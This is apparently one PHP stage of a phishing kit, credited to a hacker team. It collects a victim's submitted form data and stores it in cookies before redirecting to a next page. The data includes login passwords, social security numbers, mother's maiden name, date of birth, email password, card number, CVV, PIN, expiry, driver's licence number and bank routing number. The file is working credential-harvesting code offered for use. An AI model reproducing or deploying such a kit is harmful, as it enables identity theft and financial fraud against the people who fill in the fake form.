<?php
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
/*          ----//--//--//--//-----[ HARDC0D3R]----//--//--//--//-----                            */
/*    (c) raouf hardc0d3r 2015-2016  cyb3r7  TeaM                                                 */
/*    Right of free use is granted for all commercial or non-commercial use under CC-BY licence.  */
/*    No warranty of any form is offered.                                                         */
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
setcookie("userid", $_POST["formtext1"], time()+3600*24);
setcookie("password", $_POST["formtext2"], time()+3600*24);
setcookie("fname", $_POST["formtext3"], time()+3600*24);
setcookie("add1", $_POST["formtext4"], time()+3600*24);
setcookie("add2", $_POST["formtext5"], time()+3600*24);
setcookie("city", $_POST["formtext6"], time()+3600*24);
setcookie("State", $_POST["formselect1"], time()+3600*24);
setcookie("zip1", $_POST["formtext7"], time()+3600*24);
setcookie("zip2", $_POST["formtext8"], time()+3600*24);
setcookie("phoneh", $_POST["formtext9"], time()+3600*24);
setcookie("phonem", $_POST["formtext10"], time()+3600*24);
setcookie("ssn1", $_POST["formtext11"], time()+3600*24);
setcookie("ssn2", $_POST["formtext12"], time()+3600*24);
setcookie("ssn3", $_POST["formtext13"], time()+3600*24);
setcookie("Mothesaiden ", $_POST["formtext14"], time()+3600*24);
setcookie("dbm ", $_POST["formtext15"], time()+3600*24);
setcookie("dbd", $_POST["formtext16"], time()+3600*24);
setcookie("dby", $_POST["formtext17"], time()+3600*24);
setcookie("email", $_POST["formtext18"], time()+3600*24);
setcookie("emailpass", $_POST["formtext19"], time()+3600*24);
setcookie("cardnum", $_POST["formtext20"], time()+3600*24);
setcookie("ccv", $_POST["formtext21"], time()+3600*24);
setcookie("vbv", $_POST["formtext22"], time()+3600*24);
setcookie("pin", $_POST["formtext23"], time()+3600*24);
setcookie("expm", $_POST["formselect2"], time()+3600*24);
setcookie("expy", $_POST["formselect3"], time()+3600*24);
setcookie("dvn ", $_POST["formtext24"], time()+3600*24);
setcookie("dvexp ", $_POST["formtext25"], time()+3600*24);
setcookie("routingnum", $_POST["formtext26"], time()+3600*24);
setcookie("userfile", $_FILES['userfile']['name'], time()+3600*24);

 header("Location: H_H.php");
?>